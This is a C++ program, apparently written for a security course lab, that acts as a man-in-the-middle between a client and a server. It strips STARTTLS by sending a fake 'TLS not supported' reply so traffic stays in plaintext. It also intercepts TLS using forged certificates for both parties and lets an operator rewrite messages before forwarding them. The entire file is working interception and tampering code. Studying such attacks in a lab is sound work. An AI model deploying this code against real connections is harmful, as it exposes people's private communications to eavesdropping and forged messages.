#include<iostream>
#include<cstring>
#include<sys/socket.h>
#include<arpa/inet.h>
#include <unistd.h>
#include <netdb.h>
#include <openssl/ssl.h>
#include <openssl/err.h>
#define MAX 1024
#define CLIENT 1
#define SERVER 2

using namespace std;
//Initialize list of cipher suites
const char* str = "ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305:DHE-RSA-AES128-GCM-SHA256:DHE-RSA-AES256-GCM-SHA384";
//Creation of SSL object
SSL_CTX *InitCTX(int option)
{
    const SSL_METHOD *ssl_method;
    SSL_CTX *ctx;
    OpenSSL_add_all_algorithms();
    SSL_load_error_strings();
    if(option == CLIENT)
    {
        ssl_method = TLSv1_2_client_method();
        cout<<"\nFake Client ctx created"<<endl;
    }
    else if(option == SERVER)
    {
        ssl_method = TLSv1_2_server_method();
        cout<<"\nFake Server ctx created"<<endl;
    }
    ctx = SSL_CTX_new(ssl_method);
    if (ctx == NULL)
    {
        cout<<"\nServer ctx is null"<<endl;
        ERR_print_errors_fp(stderr);
        abort();
    }
    return ctx;
}
//------------------------------------------------------------------------------------
//Funtion for certificate setup
//------------------------------------------------------------------------------------
void configureCertificates(SSL_CTX* ctx, char* CertFile, char* KeyFile)
{
    if ( SSL_CTX_use_certificate_file(ctx, CertFile, SSL_FILETYPE_PEM) <= 0 )
    {
        cout<<"\nCertificate file not valid"<<endl;
        ERR_print_errors_fp(stderr);
        abort();
    }
    if ( SSL_CTX_use_PrivateKey_file(ctx, KeyFile, SSL_FILETYPE_PEM) <= 0 )
    {
        cout<<"\nKey file not valid"<<endl;
        ERR_print_errors_fp(stderr);
        abort();
    }
    if ( !SSL_CTX_check_private_key(ctx) )
    {
        cout<<"\nKey not match with certificate file"<<endl;
        abort();
    }
}
//------------------------------------------------------------------------------------
//Function to verify certificate
//------------------------------------------------------------------------------------
int verify_the_certificate(SSL *ssl)
{
    int result;
    X509 *cert = SSL_get_peer_certificate(ssl);
    if (cert == nullptr)
    {
        ERR_print_errors_fp(stderr);
        cout<<"\nCertificate Not Given by Peer"<<endl;
        abort();
    }
    int err = SSL_get_verify_result(ssl);
    if (err != X509_V_OK)
    {
        ERR_print_errors_fp(stderr);
        const char *err_string = X509_verify_cert_error_string(err);
        printf("\nCertificate Not Valid : %s\n", err_string);
        abort();
    }
        result = err;
    return result;   
}
//------------------------------------------------------------------------------------
//Fake Server function
//------------------------------------------------------------------------------------
int create_fake_server_socket(int port)
{
    int server_sd;
    struct sockaddr_in addr, client_addr;
    server_sd = socket(AF_INET, SOCK_STREAM, 0);
    bzero(&addr, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    addr.sin_addr.s_addr = INADDR_ANY;
    if(bind(server_sd, (struct sockaddr *)&addr, sizeof(addr)) != 0)
    {
        cout<<"\nBind port error"<<endl;
        close(server_sd);
        abort();
    }
    if (listen(server_sd, 10) != 0)
    {
        cout<<"\nListening port error"<<endl;
        close(server_sd);
        abort();
    }
    cout<<"......Waiting for client connection........\n"<<endl;
    char buff[MAX];
    socklen_t len = sizeof(client_addr);
    int connection;
    if((connection = accept(server_sd , (struct sockaddr*) & client_addr, &len)) < 0)
    {
        cout << "\nclient request not accepted" << endl;
        return 0;
    }
    else
    {
        cout << "\nClient request accepted from ip: "<<inet_ntoa(client_addr.sin_addr)<<endl ;
    }
    return connection;
}
//------------------------------------------------------------------------------------
//Fake Client function
//------------------------------------------------------------------------------------
int create_fake_client_socket(const char *hostname, int port)
{
    int client_sd;
    struct hostent *host;
    struct sockaddr_in addr;
    if ((host = gethostbyname(hostname)) == NULL)
    {
        perror(hostname);
        abort();
    }
    client_sd = socket(PF_INET, SOCK_STREAM, 0);
    bzero(&addr, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    addr.sin_addr.s_addr = *(long *)(host->h_addr);
    if (connect(client_sd, (struct sockaddr *)&addr, sizeof(addr)) != 0)
    {
        close(client_sd);
        perror(hostname);
        abort();
    }
    else
    {
        cout<<"\nClient socket created\n"<<endl;
    }
    return client_sd;   
}
//------------------------------------------------------------------------------------
//MITM Attack function-eavesdropping
//------------------------------------------------------------------------------------
int mitm_attack_1(int connection, int client_sd)
{
    char sendMessageAlice[MAX];
    char receiveMessageAlice[MAX];
    char receiveMessageBob[MAX];
    char sendMessageBob[MAX];
    int tls_flag = 0;
    while(true)
    {
        int alice_msg = recv(connection , receiveMessageAlice , MAX , 0);
        if(alice_msg < 0)
        {
            cout << "Message not recieved from Client." << endl;
            return 0;
        }
        cout<<"\nReceived message from Client on socket: "<<receiveMessageAlice<<endl;
        if((strncmp(receiveMessageAlice, "start_tls", 9))==0)
        {
            string s, s1;
            cout<<"\nEnter Fake TLS not supported message for Client: ";
            getline(cin,s);
            int n = s.size();
            for(int i = 0 ; i < n ; i++)
            {
                sendMessageAlice[i] = s[i];
            }
            sendMessageAlice[n] = '\0';
            send(connection , sendMessageAlice , strlen(sendMessageAlice)+1 , 0);
            tls_flag = 1;
            int alice_msg = recv(connection , receiveMessageAlice , MAX , 0);
            if(alice_msg < 0)
            {
                cout << "\nMessage not recieved from Client." << endl;
                return 0;
            }
            cout<<"\nReceived message from Client on socket: "<<receiveMessageAlice<<endl;
        }
            int i=0;
            while(receiveMessageAlice[i]!='\0')
            {
                sendMessageBob[i] = receiveMessageAlice[i];
                i++;
            }
            sendMessageBob[i] = '\0';
            if((strncmp(receiveMessageAlice, "term", 4))==0)
            {
                cout << "\nConnection terminated from Client." << endl;
                send(client_sd , sendMessageBob ,strlen(sendMessageBob)+1, 0);//forward message to bob
                break;
            }
            send(client_sd , sendMessageBob ,strlen(sendMessageBob)+1, 0);//forward message to bob
            int bob_msg = recv(client_sd , receiveMessageBob , MAX , 0);
            if(bob_msg < 0)
            {
                cout << "\nMessage not recieved from Server." << endl;
                break;
            }
            cout<<"\nReceived message from Server on socket: "<<receiveMessageBob<<endl;
            i=0;
            while(receiveMessageBob[i]!='\0')
            {
                sendMessageAlice[i] = receiveMessageBob[i];
                i++;
            }
            sendMessageAlice[i] = '\0';
            if((strncmp(receiveMessageBob, "term", 4))==0)
            {
                cout << "\nConnection terminated from Server." << endl;
                send(connection , sendMessageAlice , strlen(sendMessageAlice)+1, 0);
                break;
            }
            send(connection , sendMessageAlice , strlen(sendMessageAlice)+1, 0);
    }
        close(connection);
        close(client_sd);
}
//------------------------------------------------------------------------------------
//MITM Attack function-tampering
//------------------------------------------------------------------------------------
int mitm_attack_2(int connection, int client_sd)
{
    char sendMessageAlice[MAX];//client
    char receiveMessageAlice[MAX];
    char receiveMessageBob[MAX];//server
    char sendMessageBob[MAX];
    X509* cert;
    X509* peer_cert;
    SSL_CTX *ctx_client;
    SSL_CTX *ctx_server;
    SSL *ssl_client;
    SSL *ssl_server;
    int client_ver = 0;
    int server_ver = 0;
    int start_tls_flag = 0;
    int start_comm_flag = 1;
    int count =2;
    string s;
    while(count>0)
    {
        int alice_msg = recv(connection , receiveMessageAlice , MAX , 0);//receive from alice
        if(alice_msg < 0)
        {
            cout << "\nMessage not recieved from Client.\n" << endl;
            return 0;
        }
        cout << "\nFrom Alice on socket: " << receiveMessageAlice <<endl;
        int i=0;
        while(receiveMessageAlice[i]!='\0')
        {
            sendMessageBob[i] = receiveMessageAlice[i];
            i++;
        }
        sendMessageBob[i] = '\0';
        if((strncmp(receiveMessageAlice,"term",4))==0)
        {
            cout << "\nConnection terminated.\n" << endl;
            send(client_sd , sendMessageBob ,strlen(sendMessageBob)+1, 0);
            break;
        }
        send(client_sd , sendMessageBob ,strlen(sendMessageBob)+1, 0);//send to bob
        int server_msg = recv(client_sd , receiveMessageBob, MAX, 0);//receive from bob
        if(server_msg < 0)
        {
            cout << "\nMessage not recieved from Server.\n" << endl;
            break;
        }
        cout << "\nFrom Client on socket: " << receiveMessageBob <<endl;
        i=0;
        while(receiveMessageBob[i]!='\0')
        {
            sendMessageAlice[i] = receiveMessageBob[i];
            i++;
        }
        sendMessageAlice[i] = '\0';
        if((strncmp(receiveMessageBob,"term",4))==0)
        {
            cout << "\nConnection terminated.\n" << endl;
            send(connection , sendMessageAlice ,strlen(sendMessageAlice)+1, 0);
            break;
        }
        send(connection, sendMessageAlice, strlen(sendMessageAlice)+1,0);//send to alice
        if(((strncmp(receiveMessageBob,"start_tls_ack",13))==0)&&(start_tls_flag == 0))
        {
            //from server side
            SSL_library_init();
            ctx_server = InitCTX(SERVER);
            configureCertificates(ctx_server, "fake_bobcert.pem", "fake_bob.pem");//put fake bob certificates file name
            SSL_CTX_load_verify_locations(ctx_server, "/usr/local/share/ca-certificates/rootCA.crt", NULL);
            SSL_CTX_set_verify(ctx_server, SSL_VERIFY_PEER | SSL_VERIFY_FAIL_IF_NO_PEER_CERT, NULL);
            ssl_server = SSL_new(ctx_server);
            if (ssl_server == nullptr)
            {
                ERR_print_errors_fp(stderr);
                SSL_free(ssl_server);
                SSL_CTX_free(ctx_server);
                break;  
            }
            SSL_set_verify(ssl_server, SSL_VERIFY_PEER, 0);
            SSL_set_fd(ssl_server, connection);//for communication with alice
            if ( SSL_accept(ssl_server) == -1 )
            {
                ERR_print_errors_fp(stderr);
                SSL_free(ssl_server);
                SSL_CTX_free(ctx_server);
                break;
            }
            else
            {
                int result = verify_the_certificate(ssl_server);
                if(result == X509_V_OK)
                {
                    cout<<"\nClient Certificate Valid.\n";
                    server_ver = 1;
                }
            }
            ctx_client = InitCTX(CLIENT);
            configureCertificates(ctx_client, "fake_alicecert.pem", "fake_alice.pem");//put fake alice certificates file name
            SSL_CTX_load_verify_locations(ctx_client, "/usr/local/share/ca-certificates/rootCA.crt", NULL);
            SSL_CTX_set_verify(ctx_client, SSL_VERIFY_PEER | SSL_VERIFY_FAIL_IF_NO_PEER_CERT, NULL);
            ssl_client = SSL_new(ctx_client);
            if (ssl_client == nullptr)
            {
                ERR_print_errors_fp(stderr);
                SSL_free(ssl_client);
                SSL_CTX_free(ctx_client);
                break;
            }
            SSL_set_verify(ssl_client, SSL_VERIFY_PEER, 0);
            SSL_set_fd(ssl_client, client_sd);//for communication with bob
            if ( SSL_connect(ssl_client) == -1 )
            {
                ERR_print_errors_fp(stderr);
                SSL_free(ssl_client);
                SSL_CTX_free(ctx_client);
                break;
            }
            else
            {
                int result = verify_the_certificate(ssl_client);
                if(result == X509_V_OK)
                {
                    cout<<"\nServer Certificate Valid.\n";
                    client_ver = 1;
                }
            }
            if((server_ver == 1) && (client_ver == 1))
            {
                start_tls_flag = 1;
            }
        }//end of if trudy receive start_tls_ack
        count--;
    }//end while
    if((start_tls_flag==1)&&(start_comm_flag ==1))//if tls established
    {
        while(true)
        {
            SSL_read(ssl_server, receiveMessageAlice, MAX);
            //for tampering
            int i=0,n;
            int tamper =0;
            cout << "\nFrom Client on TLS: " << receiveMessageAlice <<endl;
            cout<<"\nEnter 1 to tamper: "<<endl;
            cin>>tamper;
            if(tamper==1)
            {
                cout<<"\nEnter tampered data to send to Server: "<<endl;
                getline(cin>>ws,s);
                n = s.size();
                for(int k = 0 ; k < n ; k++)
                {
                    sendMessageBob[k] = s[k];
                }
                sendMessageBob[n] = '\0';
            }
            else
            {
                i=0;
                while(receiveMessageAlice[i]!='\0')
                {
                    sendMessageBob[i] = receiveMessageAlice[i];
                    i++;
                }
                sendMessageBob[i] = '\0';
            }
            SSL_write(ssl_client,sendMessageBob, strlen(sendMessageBob)+1);
            if((strncmp(sendMessageBob,"term",4)) == 0)
            {
                cout << "\nConnection terminated.\n"<<endl ;
                abort();
                break;
            }
            tamper = 0;
            //receive from ssl_client and send to ssl_server
            SSL_read(ssl_client, receiveMessageBob, MAX);
            cout << " \nFrom Server on TLS: " << receiveMessageBob <<endl;
            cout<<"\n Enter 1 to tamper: "<<endl;
            cin>>tamper;
            s='\0';
            if(tamper==1)
            {
                cout<<"\nEnter tampered data to send to Client: "<<endl;
                getline(cin>>ws,s);
                int n = s.size();
                for(int k = 0 ; k < n ; k++)
                {
                    sendMessageAlice[k] = s[k];
                }
                sendMessageAlice[n] = '\0';
            }
            else
            {
                i=0;
                while(receiveMessageBob[i]!='\0')
                {
                    sendMessageAlice[i] = receiveMessageBob[i];
                    i++;
                }
                sendMessageAlice[i] = '\0';
            }            
            SSL_write(ssl_server,sendMessageAlice, strlen(sendMessageAlice)+1);
            if((strncmp(sendMessageAlice,"term",4)) == 0)
            {
                cout << "\nConnection terminated\n"<<endl ;
                abort();
                break;
            }
        }
    }
  else if((start_tls_flag==0)&&(start_comm_flag ==1))
  {//communicate on socket
      while(true)
      {
          recv(connection, receiveMessageAlice, MAX,0);
          if((strncmp(receiveMessageAlice,"term",4)) == 0)
          {
              cout << "\nConnection terminated from Client.\n"<<endl ;
              abort();
              break;
          }
          cout << "\nFrom Client on socket: " << receiveMessageAlice <<endl;
          int i=0;
          while(receiveMessageAlice[i]!='\0')
          {
              sendMessageBob[i] = receiveMessageAlice[i];
              i++;
          }
          sendMessageBob[i] = '\0';
          send(client_sd,sendMessageBob, strlen(sendMessageBob)+1,0);
          if((strncmp(sendMessageBob,"term",4)) == 0)
          {
              cout << "\nConnection terminated\n"<<endl ;
              abort();
              break;
          }
          //receive from ssl_client and send to ssl_server
          recv(client_sd, receiveMessageBob, MAX,0);
          if((strncmp(receiveMessageBob,"term",4)) == 0)
          {
              cout << "\nConnection terminated from Client.\n"<<endl ;
              abort();
              break;
          }
          cout << " \nFrom Server on TLS: " << receiveMessageBob <<endl;
          i=0;
          while(receiveMessageBob[i]!='\0')
          {
              sendMessageAlice[i] = receiveMessageBob[i];
              i++;
          }
          sendMessageAlice[i] = '\0';
          send(connection,sendMessageAlice, strlen(sendMessageAlice)+1,0);
          if((strncmp(sendMessageAlice,"term",4)) == 0)
          {
              cout << "\nConnection terminated\n"<<endl;
              abort();
              break;
          }          
      }
  }
close(connection);
close(client_sd);
return 0;   
}
//------------------------------------------------------------------------------------
//Main Function
//------------------------------------------------------------------------------------
int main(int argc, char *argv[])
{
    char *host_name_client, *port_no, *option;
    char *host_name_server;
    int client_sd;
    int connection;
    if (argc != 5)
    {
        cout<<"No of arguments wrong: "<<endl;
        cout<<argc<<endl;
        exit(0);
    }
    option = argv[1];
    host_name_client = argv[2];
    host_name_server = argv[3];
    port_no = argv[4];
    connection = create_fake_server_socket(atoi(port_no));//for fake Bob
    client_sd = create_fake_client_socket(host_name_server, atoi(port_no));//for fake Alice
    if(strcmp(option, "-d")==0)
    {
        mitm_attack_1(connection, client_sd);
    }
    else if(strcmp(option, "-m")==0)
    {
        mitm_attack_2(connection, client_sd);
    }
    else
    {
        cout<<"Wrong option\n"<<endl;
    }
    return 0;
}

